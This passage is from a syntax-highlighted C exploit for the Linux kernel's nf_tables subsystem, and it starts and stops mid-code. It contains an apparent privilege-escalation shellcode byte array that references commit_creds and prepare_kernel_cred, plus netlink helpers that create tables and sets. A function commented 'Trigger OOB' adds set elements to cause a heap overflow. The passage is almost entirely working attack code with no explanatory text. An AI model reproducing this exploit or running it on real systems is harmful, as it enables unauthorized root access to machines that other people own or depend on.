class="number">0x74</span>, <span class="number">0xde</span>, <span class="number">0xeb</span>, <span class="number">0x06</span>, <span class="number">0x49</span>, <span class="number">0x83</span>, <span class="number">0xc3</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xeb</span>, <span class="number">0xb9</span>, <span class="number">0x4d</span>, <span class="number">0x85</span>, <span class="number">0xc9</span>, <span class="number">0x74</span>, <span class="number">0x0a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0xc1</span>, <span class="number">0x4d</span>, <span class="number">0x89</span>, <span class="number">0x0c</span>, <span class="number">0x0e</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x5b</span>, <span class="number">0x41</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x5f</span>, <span class="number">0x5d</span>, <span class="number">0xc3</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd0</span>, <span class="number">0x49</span>, <span class="number">0xf7</span>, <span class="number">0xd8</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0xb9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xfb</span>, <span class="number">0x4e</span>, <span class="number">0x8d</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x07</span>, <span class="number">0x4d</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x4d</span>, <span class="number">0x39</span>, <span class="number">0xd3</span>, <span class="number">0x77</span>, <span class="number">0x50</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xca</span>, <span class="number">0x74</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0x8a</span>, <span class="number">0x1c</span>, <span class="number">0x0b</span>, <span class="number">0x3a</span>, <span class="number">0x1c</span>, <span class="number">0x0e</span>,</span><br><span class="line">    <span class="number">0x75</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0xeb</span>, <span class="number">0xed</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xc3</span>, <span class="number">0xeb</span>, <span class="number">0xe1</span>,</span><br><span class="line">    <span class="number">0x4d</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xf9</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe7</span>, <span class="number">0xfc</span>,</span><br><span class="line">    <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xcf</span>, <span class="number">0x73</span>, <span class="number">0x13</span>, <span class="number">0x8b</span>, <span class="number">0x0f</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xdb</span>, <span class="number">0x48</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0xcb</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xfb</span>, <span class="number">0x74</span>, <span class="number">0x11</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc7</span>, <span class="number">0x04</span>, <span class="number">0xeb</span>, <span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x4d</span>, <span class="number">0x29</span>, <span class="number">0xd9</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xdf</span>, <span class="number">0xeb</span>, <span class="number">0xab</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0xc7</span>, <span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf8</span>, <span class="number">0x5b</span>, <span class="number">0xc3</span>, <span class="number">0x63</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x6d</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x5f</span>, <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x72</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x5f</span>, <span class="number">0x6b</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x6e</span>, <span class="number">0x65</span>, <span class="number">0x6c</span>, <span class="number">0x5f</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x70</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6b</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x5f</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x6e</span>, <span class="number">0x73</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x5f</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x5f</span>, <span class="number">0x6e</span>, <span class="number">0x73</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------------------------- netlink --------------------------------------</span></span><br><span class="line"><span class="comment">// Netlink messages </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_RECEIVE_BUFFER_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Netlink attributes </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> S8_NLA_SIZE (sizeof(struct nlattr) + 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// get_batch_begin_nlmsg(): Construct a BATCH_BEGIN message for the netfilter netlink</span></span><br><span class="line"><span class="function">struct nlmsghdr *<span class="title">get_batch_begin_nlmsg</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> (struct nlmsghdr *)<span class="built_in">malloc</span>(NLMSG_SPACE(<span class="keyword">sizeof</span>(struct nfgenmsg)));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfgm</span> =</span> (struct nfgenmsg *)NLMSG_DATA(nlh);</span><br><span class="line">    <span class="keyword">if</span> (!nlh)</span><br><span class="line">        err_exit(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(nlh, <span class="number">0</span>, NLMSG_SPACE(<span class="keyword">sizeof</span>(struct nfgenmsg)));</span><br><span class="line">    nlh-&gt;nlmsg_len = NLMSG_SPACE(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line">    nlh-&gt;nlmsg_type = NFNL_MSG_BATCH_BEGIN;</span><br><span class="line">    nlh-&gt;nlmsg_pid = getpid();</span><br><span class="line">    nlh-&gt;nlmsg_flags = <span class="number">0</span>;</span><br><span class="line">    nlh-&gt;nlmsg_seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Used to access to the netfilter tables subsystem</span></span><br><span class="line">    nfgm-&gt;res_id = NFNL_SUBSYS_NFTABLES;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> nlh;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get_batch_end_nlmsg(): Construct a BATCH_END message for the netfilter netlink</span></span><br><span class="line"><span class="function">struct nlmsghdr *<span class="title">get_batch_end_nlmsg</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> (struct nlmsghdr *)<span class="built_in">malloc</span>(NLMSG_SPACE(<span class="keyword">sizeof</span>(struct nfgenmsg)));</span><br><span class="line">    <span class="keyword">if</span> (!nlh)</span><br><span class="line">        err_exit(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(nlh, <span class="number">0</span>, NLMSG_SPACE(<span class="keyword">sizeof</span>(struct nfgenmsg)));</span><br><span class="line">    nlh-&gt;nlmsg_len = NLMSG_SPACE(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line">    nlh-&gt;nlmsg_type = NFNL_MSG_BATCH_END;</span><br><span class="line">    nlh-&gt;nlmsg_pid = getpid();</span><br><span class="line">    nlh-&gt;nlmsg_flags = NLM_F_REQUEST;</span><br><span class="line">    nlh-&gt;nlmsg_seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> nlh;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set_nested_attr(): Prepare a nested netlink attribute</span></span><br><span class="line"><span class="function">struct nlattr *<span class="title">set_nested_attr</span><span class="params">(struct nlattr *attr, <span class="keyword">uint16_t</span> type, <span class="keyword">uint16_t</span> data_len)</span> </span>&#123;</span><br><span class="line">    attr-&gt;nla_type = type;</span><br><span class="line">    attr-&gt;nla_len = NLA_ALIGN(data_len + <span class="keyword">sizeof</span>(struct nlattr));</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)attr + <span class="keyword">sizeof</span>(struct nlattr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set_u32_attr(): Prepare an integer netlink attribute</span></span><br><span class="line"><span class="function">struct nlattr *<span class="title">set_u32_attr</span><span class="params">(struct nlattr *attr, <span class="keyword">uint16_t</span> type, <span class="keyword">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">    attr-&gt;nla_type = type;</span><br><span class="line">    attr-&gt;nla_len = U32_NLA_SIZE;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)NLA_ATTR(attr) = htonl(value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)attr + U32_NLA_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set_u64_attr(): Prepare a 64 bits integer netlink attribute</span></span><br><span class="line"><span class="function">struct nlattr *<span class="title">set_u64_attr</span><span class="params">(struct nlattr *attr, <span class="keyword">uint16_t</span> type, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">    attr-&gt;nla_type = type;</span><br><span class="line">    attr-&gt;nla_len = U64_NLA_SIZE;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)NLA_ATTR(attr) = htobe64(value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)attr + U64_NLA_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set_str8_attr(): Prepare a 8 bytes long string netlink attribute</span></span><br><span class="line"><span class="comment">// @name: Buffer to copy into the attribute</span></span><br><span class="line"><span class="function">struct nlattr *<span class="title">set_str8_attr</span><span class="params">(struct nlattr *attr, <span class="keyword">uint16_t</span> type, <span class="keyword">const</span> <span class="keyword">char</span> name[<span class="number">8</span>])</span> </span>&#123;</span><br><span class="line">    attr-&gt;nla_type = type;</span><br><span class="line">    attr-&gt;nla_len = S8_NLA_SIZE;</span><br><span class="line">    <span class="built_in">memcpy</span>(NLA_ATTR(attr), name, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)attr + S8_NLA_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set_binary_attr(): Prepare a byte array netlink attribute</span></span><br><span class="line"><span class="comment">// @buffer: Buffer with data to send</span></span><br><span class="line"><span class="comment">// @buffer_size: Size of the previous buffer</span></span><br><span class="line"><span class="function">struct nlattr *<span class="title">set_binary_attr</span><span class="params">(struct nlattr *attr, <span class="keyword">uint16_t</span> type, <span class="keyword">uint8_t</span> *buffer, <span class="keyword">uint64_t</span> buffer_size)</span> </span>&#123;</span><br><span class="line">    attr-&gt;nla_type = type;</span><br><span class="line">    attr-&gt;nla_len = NLA_BIN_SIZE(buffer_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(NLA_ATTR(attr), buffer, buffer_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------------------------- nf_tables --------------------------------------</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC64_KEYLEN (64 - 8 - 12 - 16) <span class="comment">// Max size - elemsize - sizeof(nft_set_ext)(align) - min datasize</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> zerobuf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create_table(): Register a new table for the inet family</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_table</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">dest_snl</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[3];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh_batch_begin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh_batch_end</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfm</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Destination preparation</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;dest_snl, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest_snl));</span><br><span class="line">    dest_snl.nl_family = AF_NETLINK;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. Netlink batch_begin message preparation</span></span><br><span class="line">    nlh_batch_begin = get_batch_begin_nlmsg();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Netlink table message preparation</span></span><br><span class="line">    nlh = (struct nlmsghdr *)<span class="built_in">malloc</span>(TABLEMSG_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (!nlh)</span><br><span class="line">        err_exit(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(nlh, <span class="number">0</span>, TABLEMSG_SIZE);</span><br><span class="line">    nlh-&gt;nlmsg_len = TABLEMSG_SIZE;</span><br><span class="line">    nlh-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; <span class="number">8</span>) | NFT_MSG_NEWTABLE;</span><br><span class="line">    nlh-&gt;nlmsg_pid = getpid();</span><br><span class="line">    nlh-&gt;nlmsg_flags = NLM_F_REQUEST;</span><br><span class="line">    nlh-&gt;nlmsg_seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nfm = NLMSG_DATA(nlh);</span><br><span class="line">    nfm-&gt;nfgen_family = NFPROTO_INET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare associated attribute</span></span><br><span class="line">    attr = (<span class="keyword">void</span> *)nlh + NLMSG_SPACE(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line">    set_str8_attr(attr, NFTA_TABLE_NAME, name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Netlink batch_end message preparation </span></span><br><span class="line">    nlh_batch_end = get_batch_end_nlmsg();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IOV preparation</span></span><br><span class="line">    <span class="built_in">memset</span>(iov, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct iovec) * <span class="number">3</span>);</span><br><span class="line">    iov[<span class="number">0</span>].iov_base = (<span class="keyword">void</span> *)nlh_batch_begin;</span><br><span class="line">    iov[<span class="number">0</span>].iov_len = nlh_batch_begin-&gt;nlmsg_len;</span><br><span class="line">    iov[<span class="number">1</span>].iov_base = (<span class="keyword">void</span> *)nlh;</span><br><span class="line">    iov[<span class="number">1</span>].iov_len = nlh-&gt;nlmsg_len;</span><br><span class="line">    iov[<span class="number">2</span>].iov_base = (<span class="keyword">void</span> *)nlh_batch_end;</span><br><span class="line">    iov[<span class="number">2</span>].iov_len = nlh_batch_end-&gt;nlmsg_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Message header preparation </span></span><br><span class="line">    msg.msg_name = (<span class="keyword">void</span> *)&amp;dest_snl;</span><br><span class="line">    msg.msg_namelen = <span class="keyword">sizeof</span>(struct sockaddr_nl);</span><br><span class="line">    msg.msg_iov = iov;</span><br><span class="line">    msg.msg_iovlen = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    sendmsg(sock, &amp;msg, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Free used structures</span></span><br><span class="line">    <span class="built_in">free</span>(nlh_batch_end);</span><br><span class="line">    <span class="built_in">free</span>(nlh);</span><br><span class="line">    <span class="built_in">free</span>(nlh_batch_begin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create_set(): Create a netfilter set</span></span><br><span class="line"><span class="comment"> * @sock: Socket used to communicate throught the netfilter netlink</span></span><br><span class="line"><span class="comment"> * @set_name: Name of the created set</span></span><br><span class="line"><span class="comment"> * @set_keylen: Length of the keys of this set. Used in the exploit to control the used cache</span></span><br><span class="line"><span class="comment"> * @data_len: Length of stored data. Used to control the size of the overflow</span></span><br><span class="line"><span class="comment"> * @table_name: Name of the table that stores this set</span></span><br><span class="line"><span class="comment"> * @id: ID of the created set */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_set</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">const</span> <span class="keyword">char</span> *set_name, <span class="keyword">uint32_t</span> set_keylen, <span class="keyword">uint32_t</span> data_len, <span class="keyword">const</span> <span class="keyword">char</span> *table_name, <span class="keyword">uint32_t</span> id)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">dest_snl</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh_batch_begin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh_payload</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh_batch_end</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> nlh_payload_size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[3];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare the netlink sockaddr for msg</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;dest_snl, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_nl));</span><br><span class="line">    dest_snl.nl_family = AF_NETLINK;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. First netlink message: batch_begin */</span></span><br><span class="line">    nlh_batch_begin = get_batch_begin_nlmsg();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Second netlink message : Set attributes */</span></span><br><span class="line">    nlh_payload_size = <span class="keyword">sizeof</span>(struct nfgenmsg);     <span class="comment">// Mandatory</span></span><br><span class="line">    nlh_payload_size += S8_NLA_SIZE;                <span class="comment">// NFTA_SET_TABLE</span></span><br><span class="line">    nlh_payload_size += S8_NLA_SIZE;                <span class="comment">// NFTA_SET_NAME</span></span><br><span class="line">    nlh_payload_size += U32_NLA_SIZE;               <span class="comment">// NFTA_SET_ID</span></span><br><span class="line">    nlh_payload_size += U32_NLA_SIZE;               <span class="comment">// NFTA_SET_KEY_LEN</span></span><br><span class="line">    nlh_payload_size += U32_NLA_SIZE;               <span class="comment">// NFTA_SET_FLAGS</span></span><br><span class="line">    nlh_payload_size += U32_NLA_SIZE;               <span class="comment">// NFTA_SET_DATA_TYPE</span></span><br><span class="line">    nlh_payload_size += U32_NLA_SIZE;               <span class="comment">// NFTA_SET_DATA_LEN</span></span><br><span class="line">    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation</span></span><br><span class="line">    nlh_payload = (struct nlmsghdr *)<span class="built_in">malloc</span>(nlh_payload_size);</span><br><span class="line">    <span class="keyword">if</span> (!nlh_payload)</span><br><span class="line">        err_exit(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(nlh_payload, <span class="number">0</span>, nlh_payload_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fill the required fields</span></span><br><span class="line">    nlh_payload-&gt;nlmsg_len = nlh_payload_size;</span><br><span class="line">    nlh_payload-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; <span class="number">8</span>) | NFT_MSG_NEWSET;</span><br><span class="line">    nlh_payload-&gt;nlmsg_pid = getpid();</span><br><span class="line">    nlh_payload-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;</span><br><span class="line">    nlh_payload-&gt;nlmsg_seq = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Setup the nfgenmsg</span></span><br><span class="line">    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);</span><br><span class="line">    nfm-&gt;nfgen_family = NFPROTO_INET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup the attributes</span></span><br><span class="line">    attr = (struct nlattr *)((<span class="keyword">void</span> *)nlh_payload + NLMSG_SPACE(<span class="keyword">sizeof</span>(struct nfgenmsg)));</span><br><span class="line">    attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);</span><br><span class="line">    attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);</span><br><span class="line">    attr = set_u32_attr(attr, NFTA_SET_ID, id);</span><br><span class="line">    attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);</span><br><span class="line">    attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);</span><br><span class="line">    attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, <span class="number">0</span>);</span><br><span class="line">    set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Last netlink message: batch_end </span></span><br><span class="line">    nlh_batch_end = get_batch_end_nlmsg();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup the iovec</span></span><br><span class="line">    <span class="built_in">memset</span>(iov, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct iovec) * <span class="number">3</span>);</span><br><span class="line">    iov[<span class="number">0</span>].iov_base = (<span class="keyword">void</span> *)nlh_batch_begin;</span><br><span class="line">    iov[<span class="number">0</span>].iov_len = nlh_batch_begin-&gt;nlmsg_len;</span><br><span class="line">    iov[<span class="number">1</span>].iov_base = (<span class="keyword">void</span> *)nlh_payload;</span><br><span class="line">    iov[<span class="number">1</span>].iov_len = nlh_payload-&gt;nlmsg_len;</span><br><span class="line">    iov[<span class="number">2</span>].iov_base = (<span class="keyword">void</span> *)nlh_batch_end;</span><br><span class="line">    iov[<span class="number">2</span>].iov_len = nlh_batch_end-&gt;nlmsg_len;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. Prepare the message to send</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct msghdr));</span><br><span class="line">    msg.msg_name = (<span class="keyword">void</span> *)&amp;dest_snl;</span><br><span class="line">    msg.msg_namelen = <span class="keyword">sizeof</span>(struct sockaddr_nl);</span><br><span class="line">    msg.msg_iov = iov;</span><br><span class="line">    msg.msg_iovlen = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send message</span></span><br><span class="line">    sendmsg(sock, &amp;msg, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Free allocated memory</span></span><br><span class="line">    <span class="built_in">free</span>(nlh_batch_end);</span><br><span class="line">    <span class="built_in">free</span>(nlh_payload);</span><br><span class="line">    <span class="built_in">free</span>(nlh_batch_begin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* add_elem_to_set(): Trigger OOB</span></span><br><span class="line"><span class="comment"> * @sock: Socket used to communicate throught the netfilter netlink</span></span><br><span class="line"><span class="comment"> * @set_name: Name of the set to add the element</span></span><br><span class="line"><span class="comment"> * @set_keylen: Length of the keys of the previous set</span></span><br><span class="line"><span class="comment"> * @table_name: Table associated to the preiv</span></span><br><span class="line"><span class="comment"> * @id: ID of the previous set</span></span><br><span class="line"><span class="comment"> * @data_len: Length of the data to copy. (= Size of the overflow - 16 )</span></span><br><span class="line"><span class="comment"> * @data: Data used for the overflow</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Submit two elements to add to the set.</span></span><br><span class="line"><span class="comment"> * The first one is used to setup the data payload</span></span><br><span class="line"><span class="comment"> * The second will trigger the overflow */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_elem_to_set</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">const</span> <span class="keyword">char</span> *set_name, <span class="keyword">uint32_t</span> set_keylen, <span class="keyword">const</span> <span class="keyword">char</span> *table_name, <span class="keyword">uint32_t</span> id, <span class="keyword">uint32_t</span> data_len, <span class="keyword">uint8_t</span> *data)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">dest_snl</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh_batch_begin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh_payload</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh_batch_end</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> nlh_payload_size;</span><br><span class="line">    <span class="keyword">uint64_t</span> nested_attr_size;</span><br><span class="line">    <span class="keyword">size_t</span> first_element_size;</span><br><span class="line">    <span class="keyword">size_t</span> second_element_size;</span><br><span class="line">    <span 